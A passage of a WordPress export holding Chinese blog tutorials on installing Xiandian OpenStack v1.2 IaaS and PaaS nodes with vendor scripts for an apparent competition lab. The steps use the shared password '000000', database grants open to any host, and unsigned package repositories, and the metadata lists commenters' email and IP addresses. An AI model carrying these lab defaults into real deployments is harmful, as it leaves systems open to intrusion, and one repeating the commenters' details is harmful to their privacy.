<strong>二、把脚本复制进controller，并作出相应修改以及赋予可执行权限</strong>

<pre>sed -i 's,192.168.100.10,192.168.1.100,g' *.sh</pre>

<pre>sed -i 's,192.168.100.20,192.168.1.200,g' *.sh</pre>

<pre>sed -i 's,eth1,eth0,g' *.sh</pre>

<strong>注意：比赛时注意区分eth0和eth1对应哪张是外网、内网。</strong>
<strong>脚本内的ip，是内网ip。</strong>
<strong>脚本内的网卡，是外网网卡。（neutron使用外网网卡）</strong>

<pre>chmod +x *.sh</pre>

&nbsp;
<strong>三、安装Mysql服务</strong>

<pre>./iaas-install-mysql.sh</pre>

&nbsp;
<strong>四、修改sh</strong>
因为database.sh是在windows下编写，换行符可能导致出现问题，所以需要进行修改。

<pre>vi database.sh</pre>

输入：

<pre>set ff=unix</pre>

&nbsp;
<strong>五、安装keystone服务</strong>

<pre>./iaas-install-keystone.sh</pre>

可用<span style="color: #ff0000;">ps -ef | grep keystone</span>检查keystone服务是否正常工作。
<strong> </strong>
<strong>六、</strong><strong>安装glance服务</strong>

<pre>./iaas-install-glance.sh</pre>

安装完毕之后把系统镜像载入到glance

<pre>source /etc/keystone/admin-openrc.sh</pre>

<pre>glance image-create --name 'centos6.5' --disk-format qcow2 --container-format bare --is-public true --progress &lt; /opt/icehouse/images/centos_65_x86_6420140327.qcow2</pre>

导入完成后可用<span style="color: #ff0000;">glance index</span>查看是否正常工作
&nbsp;
<strong>七、安装controller节点的nova服务（可同时安装compute节点的nova服务）</strong>

<pre>./iaas-install-nova-controller.sh</pre>

可用<span style="color: #ff0000;">nova service-list</span>检查服务是否正常开启
&nbsp;
<strong>八、安装controller节点的neutron服务（可同时安装compute节点的neutron服务）</strong>

<pre>./iaas-install-neutron-controller.sh</pre>

新建一个网络：
赋值给tenantID：

<pre>tenantID=`keystone tenant-list | grep service | awk '{print $2}'`</pre>

新建网络：

<pre>neutron net-create --tenant-id $tenantID sharednet1 --shared --provider:network_type flat --provider:physical_network physnet1</pre>

&nbsp;
<strong>九、安装dashboard服务以及memcached缓存服务。</strong>

<pre>yum install memcached python-memcached mod_wsgi openstack-dashboard –y</pre>

修改<span style="color: #ff0000;">vi /etc/openstack-dashboard/local_settings</span>
1、
<span style="color: #ff0000;">ALLOWED_HOSTS = ['horizon.example.com', 'localhost']</span>添加内网ip
修改后
<span style="color: #ff0000;">ALLOWED_HOSTS = ['horizon.example.com','192.168.1.100','localhost']</span>
&nbsp;
2、
<span style="color: #ff0000;"># memcached set CACHES to something like</span>
<span style="color: #ff0000;">CACHES = {</span>
<span style="color: #ff0000;">'default': {</span>
<span style="color: #ff0000;">'BACKEND' : 'django.core.cache.backends.memcached.MemcachedCache',</span>
<span style="color: #ff0000;">'LOCATION' : '127.0.0.1:11211',</span>
<span style="color: #ff0000;">}</span>
<span style="color: #ff0000;">}</span>
去除注释
&nbsp;
3、修改<span style="color: #ff0000;">OPENSTACK_HOST = "controller"</span>
&nbsp;
然后重启Apache2服务

<pre>/etc/init.d/httpd restart</pre>

&nbsp;
<strong>十、安装controller节点的cinder服务（可同时安装compute节点的cinder服务）</strong>

<pre>vi iaas-install-cinder-controller.sh</pre>

创建一个1G大小的云硬盘

<pre>cinder create --display-name demo1 1</pre>

&nbsp;
<strong>十一、安装Heat服务</strong>
创建数据库：

<pre>mysql –uroot –p000000</pre>

<pre>create database heat;</pre>

<pre>grant all on heat.* to heat@’localhost’ identified by ‘000000’;</pre>

<pre>grant all on heat.* to heat@’%’ identified by ‘000000’;</pre>

<pre>exit;</pre>

安装服务：

<pre>vi iaas-install-heat.sh</pre>

&nbsp;
<strong>十二、安装controller节点的Swift服务</strong>
打开<span style="color: #ff0000;">iaas-install-swift-controller.sh</span>
把预留的分区添加进：OBJECT_DISK=
创建数据库：

<pre>mysql –uroot –p000000</pre>

<pre>create database swift;</pre>

<pre>grant all on swift.* to swift @’localhost’ identified by ‘000000’;</pre>

<pre>grant all on swift.* to swift @’%’ identified by ‘000000’;</pre>

安装服务：

<pre>./iaas-install-swift-controller.sh</pre>

添加文件：

<pre>swift upload contrainer1 test.txt</pre>

<pre>swift list container1</pre>

<pre>swift download container1 test.txt</pre>

<strong> </strong>
<strong>十三、安装controller节点的sahara服务</strong>
安装服务：

<pre>./iaas-install-sahara-controller.sh</pre>

导入镜像：

<pre>glance image-create --name 'sahara-centos6.5' --disk-format qcow2 --container-format bare --is-public true --progress &lt; /opt/icehouse/images/sahara-icehouse-vanilla-1.2.1-centos-6.5.qcow2</pre>

<strong>重启</strong>服务器。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>437</wp:post_id>
		<wp:post_date><![CDATA[2015-12-30 19:34:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-30 11:34:16]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%88%e7%94%b5openstack-v1-2-iaas%e5%b9%b3%e5%8f%b0%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="openstack"><![CDATA[OpenStack]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="post_tag" nicename="%e5%8e%9f%e5%88%9b"><![CDATA[原创]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[672]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>18</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.5]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-12-30 20:40:21]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-12-30 12:40:21]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[:a7: 评论表情测试]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>19</wp:comment_id>
			<wp:comment_author><![CDATA[logistics]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[280552103@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[110.52.97.38]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-08-21 11:36:08]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-08-21 03:36:08]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[能否将控制节点和计算节点的shell文件打个包，发给我，研究学习下，多谢。qq邮箱：  280552103@qq.com            ^_^]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>先电OpenStack v1.2 - IaaS平台Compute节点搭建配置（脚本版）</title>
		<link>https://www.nervgeek.com/2015/12/30/%e5%85%88%e7%94%b5openstack-v1-2-iaas%e5%b9%b3%e5%8f%b0compute%e8%8a%82%e7%82%b9%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89/</link>
		<pubDate>Wed, 30 Dec 2015 12:59:08 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=463</guid>
		<description></description>
		<content:encoded><![CDATA[<h2 style="text-align: center;">Compute安装</h2>

<strong>前提：修改eth0、eth1的ip（只能有一张网卡设置网关，建议设置外网网关）；selinux修改为permissive；修改hosts，添加controller和compute的内网ip。 </strong>
<strong>设置源：</strong>
<strong> </strong>

<table width="909">
<tbody>
<tr>
<td width="437">[centos]
name= centos
baseurl= ftp://controller/centos/
enabled=1
gpgcheck=0</td>
<td width="473">[icehouse]
name= icehouse
baseurl=ftp://controller/icehouse/iaas-repo/
enabled=1
gpgcheck=0</td>
</tr>
</tbody>
</table>

<!--more-->
&nbsp;
&nbsp;
<strong>一、与controller同步时间</strong>
1、安装ntp

<pre>yum install ntp</pre>

2、同步时间

<pre>ntpdate controller</pre>

3、设置开机启动

<pre>chkconfig ntpd on</pre>

&nbsp;
<strong>二、把脚本复制进compute，并作出相应修改</strong>

<pre>sed -i 's,192.168.100.10,192.168.1.100,g' *.sh</pre>

<pre>sed -i 's,192.168.100.20,192.168.1.200,g' *.sh</pre>

<pre>sed -i 's,eth1,eth0,g' *.sh</pre>

&nbsp;
<strong>三、安装compute节点的nova服务</strong>

<pre>./iaas-install-nova-compute.sh</pre>

&nbsp;
<strong>四、安装compute节点的neutron服务</strong>

<pre>./iaas-install-neutron-compute.sh</pre>

&nbsp;
<strong>五、安装compute节点的cinder服务</strong>
修改脚本 :

<pre>vi iaas-install-cinder-compute.sh</pre>

把预留的分区添加进：<span style="color: #ff0000;">OBJECT_DISK=</span>
安装服务：

<pre>./iaas-install-cinder-compute.sh</pre>

&nbsp;
<strong>六、安装compute节点的swift服务</strong>
打开<span style="color: #ff0000;">iaas-install-swift-compute.sh</span>
把预留的分区添加进：<span style="color: #ff0000;">OBJECT_DISK=</span>
安装服务：

<pre>./iaas-install-swift-compute.sh</pre>

&nbsp;
<strong>七、安装compute节点的sahara服务</strong>
安装服务：

<pre>./iaas-install-sahara-compute.sh</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>463</wp:post_id>
		<wp:post_date><![CDATA[2015-12-30 20:59:08]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-30 12:59:08]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%88%e7%94%b5openstack-v1-2-iaas%e5%b9%b3%e5%8f%b0compute%e8%8a%82%e7%82%b9%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="openstack"><![CDATA[OpenStack]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="post_tag" nicename="%e5%8e%9f%e5%88%9b"><![CDATA[原创]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[358]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>20</wp:comment_id>
			<wp:comment_author><![CDATA[logistics]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[280552103@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[110.52.97.38]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-08-21 11:34:33]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-08-21 03:34:33]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[能否将控制节点和计算节点的shell文件打个包，发给我，研究学习下，多谢。qq邮箱：  280552103@qq.com]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>21</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[14.209.57.214]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-08-23 13:15:17]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-08-23 05:15:17]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[您好，我这个OpenStack是光电比赛的版本，所以脚本等文件都是先电的，我提供M版本的搭建视频给您吧。
百度盘：http://pan.baidu.com/s/1cuXLca]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>20</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>先电OpenStack v1.2 - PaaS平台Broker节点搭建配置（脚本版）</title>
		<link>https://www.nervgeek.com/2015/12/30/%e5%85%88%e7%94%b5openstack-v1-2-paas%e5%b9%b3%e5%8f%b0broker%e8%8a%82%e7%82%b9%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89/</link>
		<pubDate>Wed, 30 Dec 2015 13:08:01 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=468</guid>
		<description></description>
		<content:encoded><![CDATA[<h2 style="text-align: center;"><strong>Broker</strong><strong>安装</strong></h2>

<strong>前提：修改eth0的ip；selinux修改为enforcing，<span style="color: #ff0000;">然后重启！！！</span></strong>
<strong> </strong>
<strong>设置源：</strong>

<table width="871">
<tbody>
<tr>
<td width="436">[openshift-base]
name=openshift-base
baseurl=ftp://10.1.1.100/paas/openshift-base
enabled=1
gpgcheck=0</td>
<td width="436">[openshift-epel]
name=openshift-epel
baseurl=ftp://10.1.1.100/paas/openshift-epel
enabled=1
gpgcheck=0</td>
</tr>
<tr>
<td width="436">[openshift-origin]
name=openshift-origin
baseurl=ftp://10.1.1.100/paas/openshift-origin
enabled=1
gpgcheck=0</td>
<td width="436">[openshift-origin-dependencies]
name=openshift-origin-dependencies
baseurl=ftp://10.1.1.100/paas/openshift-origin-dependencies
enabled=1
gpgcheck=0</td>
</tr>
</tbody>
</table>

<!--more-->
&nbsp;
&nbsp;
<strong>一、安装paas-xiandian</strong>

<pre>yum install paas-xiandian</pre>

&nbsp;
安装完毕修改/etc/xiandian/config.ini文件
配置broker节点
&nbsp;
A_HOST=broker
B_HOST=node
A_DOMAIN=example.com
A_IP=192.168.1.5
B_IP=192.168.1.6
A_DBPASSWORD=000000
ADMINPASSWORD=000000
REPOBASE=ftp://192.168.1.100/
HTUSER=demo
HTPASSWORD=000000
&nbsp;
&nbsp;
执行脚本<span style="color: #ff0000;">runbefore.sh</span>
<strong> </strong>
<strong>二、安装依赖库和资源库</strong>

<pre>paas-pre-host.sh</pre>

<span style="color: #ff0000;"><strong>重启！！！</strong></span>
&nbsp;
<strong>三、安装DNS服务</strong>

<pre>paas-pre-broker.sh</pre>

&nbsp;
<strong>四、安装数据库</strong>

<pre>paas-install-mongodb.sh</pre>

<strong> </strong>
<strong>五、安装ActiveMQ消息管理客户端服务</strong>

<pre>paas-install-activemq.sh</pre>

&nbsp;
<strong>六、安装Puppet MColltive Client消息管理服务端服务</strong>

<pre>paas-install-mcollective.sh</pre>

<strong> </strong>
<strong>七、安装配置身份服务</strong>

<pre>paas-install-broker.sh</pre>

在脚本执行过程中，要求输入 key 加密随机数，重复输入 2 次回车即可
<strong> </strong>
<strong>八、安装插件</strong>

<pre>paas-install-broker-plugins.sh</pre>

检验：
通过访问Broker的API json服务进行验证是否安装正确：

<pre>curl -u admin:000000 <a href="http://localhost:8080/broker/rest/api.json">http://localhost:8080/broker/rest/api.json</a></pre>

<strong> </strong>
<strong>九、安装WebConsole服务</strong>

<pre>paas-install-webconsole.sh</pre>

<strong> </strong>
<strong>十、安装Broker节点的Node容器</strong>

<pre>paas-node-install-controller.sh</pre>

<span style="color: #ff0000;"><strong>重启！！！</strong></span>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>468</wp:post_id>
		<wp:post_date><![CDATA[2015-12-30 21:08:01]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-30 13:08:01]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%88%e7%94%b5openstack-v1-2-paas%e5%b9%b3%e5%8f%b0broker%e8%8a%82%e7%82%b9%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="openstack"><![CDATA[OpenStack]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="post_tag" nicename="%e5%8e%9f%e5%88%9b"><![CDATA[原创]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[718]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>22</wp:comment_id>
			<wp:comment_author><![CDATA[yoyoxie]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[yoyoxie0729@gmail.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[60.12.1.251]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-03-23 16:58:19]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-03-23 08:58:19]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[相同的平台，一样的步骤 。做完webconsole之后http://paas.example.com无法打开，提示DNS解析错误，只能通过broker节点的ip去访问，求解决方案]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>23</wp:comment_id>
			<wp:comment_author><![CDATA[yoyoxie]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[yoyoxie0729@gmail.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[60.12.1.251]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-03-23 17:40:21]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-03-23 09:40:21]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[已解决，需配置DNS解析为节点ip]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>22</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>24</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.212]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-03-25 20:41:02]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-03-25 12:41:02]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[不好意思，最近忘了看博客，没错，需要修改本地DNS。]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>23</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>25</wp:comment_id>
			<wp:comment_author><![CDATA[江湖一刀]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[280552103@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[110.52.97.38]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-08-21 10:07:57]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-08-21 02:07:57]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[runbefore.sh等脚本存放路径在哪儿]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>26</wp:comment_id>
			<wp:comment_author><![CDATA[江湖一刀]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[280552103@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[110.52.97.38]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-08-21 10:10:12]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-08-21 02:10:12]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[请加我qq: 280552103            添加时请注明：openstack
非常希望和你这种openstack爱好者交流]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>先电OpenStack v1.2 - PaaS平台Node节点搭建配置（脚本版）</title>
		<link>https://www.nervgeek.com/2015/12/30/%e5%85%88%e7%94%b5openstack-v1-2-paas%e5%b9%b3%e5%8f%b0node%e8%8a%82%e7%82%b9%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89/</link>
		<pubDate>Wed, 30 Dec 2015 13:10:16 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=470</guid>
		<description></description>
		<content:encoded><![CDATA[<h2 style="text-align: center;"><strong>Node </strong><strong>安装</strong></h2>

<strong>前提：修改eth0的ip；selinux修改为enforcing，<span style="color: #ff0000;">然后重启！！！</span></strong>
&nbsp;
<strong>配置yum源</strong>

<table width="871">
<tbody>
<tr>
<td width="436">[openshift-base]
name=openshift-basebaseurl=ftp://10.1.1.100/paas/openshift-base
enabled=1
gpgcheck=0</td>
<td width="436">[openshift-epel]
name=openshift-epel
baseurl=ftp://10.1.1.100/paas/openshift-epel
enabled=1
gpgcheck=0</td>
</tr>
<tr>
<td width="436">[openshift-origin]
name=openshift-origin
baseurl=ftp://10.1.1.100/paas/openshift-origin
enabled=1
gpgcheck=0</td>
<td width="436">[openshift-origin-dependencies]
name=openshift-origin-dependencies
baseurl=ftp://10.1.1.100/paas/openshift-origin-dependencies
enabled=1
gpgcheck=0</td>
</tr>
</tbody>
</table>

<strong> </strong><!--more-->
<strong> </strong>
<strong> 一、</strong><strong>安装paas-xiandian</strong>

<pre>yum install paas-xiandian</pre>

&nbsp;
安装完毕修改<span style="color: #ff0000;">/etc/xiandian/config.ini</span>文件
配置node节点（与broker节点相同）
&nbsp;
&nbsp;
A_HOST=broker
B_HOST=node
A_DOMAIN=example.com
A_IP=192.168.1.5
B_IP=192.168.1.6
A_DBPASSWORD=000000
ADMINPASSWORD=000000
REPOBASE=ftp://192.168.1.100/
HTUSER=demo
HTPASSWORD=000000
&nbsp;
&nbsp;
&nbsp;
执行脚本<span style="color: #ff0000;">runbefore.sh</span>
<strong> </strong>
<strong>二、安装依赖库和资源库</strong>

<pre>paas-pre-node.sh</pre>

<strong>重启！！！</strong>
<strong> </strong>
<strong>三、安装Node节点Node容器</strong>

<pre>paas-node-install-node.sh</pre>

<strong> </strong>
<strong>四、配置多租户</strong>

<pre>paas-config-multi-tenancy.sh</pre>

<span style="color: #ff0000;"><strong>重启！！！</strong></span>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>470</wp:post_id>
		<wp:post_date><![CDATA[2015-12-30 21:10:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-30 13:10:16]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%88%e7%94%b5openstack-v1-2-paas%e5%b9%b3%e5%8f%b0node%e8%8a%82%e7%82%b9%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="openstack"><![CDATA[OpenStack]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="post_tag" nicename="%e5%8e%9f%e5%88%9b"><![CDATA[原创]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
